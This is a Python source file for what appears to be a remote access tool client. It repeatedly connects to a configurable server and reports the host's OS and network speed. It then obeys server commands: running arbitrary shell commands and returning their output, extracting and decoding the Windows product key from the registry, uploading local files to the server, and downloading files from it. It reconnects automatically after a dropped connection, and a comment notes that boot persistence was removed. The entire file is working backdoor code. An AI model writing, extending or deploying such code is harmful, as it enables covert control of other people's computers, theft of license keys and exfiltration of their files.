import os
import socket
import time
import platform
import subprocess
import psutil  # To monitor network speed
import winreg  # Still needed if you keep the get_windows_key()

SERVER_IP = "127.0.0.1"  # Update with the server's IP
SERVER_PORT = 9999
BUFFER_SIZE = 4096  # Size of each chunk for file transfer


def get_windows_key():
    """
    Retrieves the Windows product key using logic from the test.py file.
    """
    try:
        def get_key(path, name):
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
            value, _ = winreg.QueryValueEx(key, name)
            return value

        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
        digital_product_id = get_key(key_path, "DigitalProductId")

        def decode_key(data):
            key_chars = "BCDFGHJKMPQRTVWXY2346789"
            key = []
            for i in range(24, 0, -1):
                current = 0
                for j in range(14, -1, -1):
                    current = current * 256 + data[j]
                    data[j] = current // 24
                    current %= 24
                key.insert(0, key_chars[current])
                if (i % 5 == 0) and (i != 0):
                    key.insert(0, '-')
            return ''.join(key)

        windows_key = decode_key(list(digital_product_id)[52:67])
        return windows_key
    except Exception as e:
        return f"Error retrieving Windows key: {e}"


def get_network_speed():
    """
    Measures network speed using psutil.
    Returns the speed in KB/s.
    """
    try:
        net_io_start = psutil.net_io_counters()
        time.sleep(1)  # Measure speed over 1 second
        net_io_end = psutil.net_io_counters()

        sent_speed = (net_io_end.bytes_sent - net_io_start.bytes_sent) / 1024  # KB/s
        recv_speed = (net_io_end.bytes_recv - net_io_start.bytes_recv) / 1024  # KB/s

        return sent_speed, recv_speed
    except Exception as e:
        print(f"[ERROR] Network speed measurement failed: {e}")
        return 0, 0


def upload_file(client_socket, filepath):
    """
    Uploads a file to the server.
    """
    try:
        if os.path.exists(filepath):
            filename = os.path.basename(filepath)
            client_socket.send(f"UPLOAD:{filename}".encode())

            with open(filepath, "rb") as file:
                while chunk := file.read(BUFFER_SIZE):
                    client_socket.send(chunk)
            client_socket.send(b"EOF")  # Indicate end of file transfer
            print(f"[INFO] File '{filename}' uploaded successfully.")
        else:
            print(f"[ERROR] File '{filepath}' does not exist.")
    except Exception as e:
        print(f"[ERROR] File upload failed: {e}")


def download_file(client_socket, filename):
    """
    Downloads a file from the server.
    """
    try:
        client_socket.send(f"DOWNLOAD:{filename}".encode())

        with open(f"downloaded_{filename}", "wb") as file:
            while True:
                chunk = client_socket.recv(BUFFER_SIZE)
                if chunk == b"EOF":  # End of file transfer
                    break
                file.write(chunk)
        print(f"[INFO] File '{filename}' downloaded successfully.")
    except Exception as e:
        print(f"[ERROR] File download failed: {e}")


def main():
    """
    Main client logic to connect to the server and perform requested operations.
    Persistence on system boot has been removed.
    """
    while True:
        try:
            # Connect to server
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))

            # Send system details
            os_details = platform.platform()
            client_socket.send(f"OS: {os_details}".encode())

            while True:
                # Measure and send network speed
                sent_speed, recv_speed = get_network_speed()
                speed_message = f"Speed: {sent_speed:.2f} KB/s up, {recv_speed:.2f} KB/s down"
                client_socket.send(speed_message.encode())

                # Receive commands from the server
                command = client_socket.recv(1024).decode()
                if command.lower() == "exit":
                    break
                elif command.lower() == "get_key":
                    key = get_windows_key()
                    client_socket.send(f"Windows Key: {key}".encode())
                elif command.lower().startswith("shell:"):
                    cmd = command.split("shell:")[1]
                    output = subprocess.getoutput(cmd)
                    client_socket.send(output.encode())
                elif command.lower().startswith("upload:"):
                    filepath = command.split("upload:")[1].strip()
                    upload_file(client_socket, filepath)
                elif command.lower().startswith("download:"):
                    filename = command.split("download:")[1].strip()
                    download_file(client_socket, filename)

            client_socket.close()
        except Exception:
            print("[ERROR] Connection lost. Reconnecting in 5 seconds...")
            time.sleep(5)  # Wait and try reconnecting


if __name__ == "__main__":
    main()
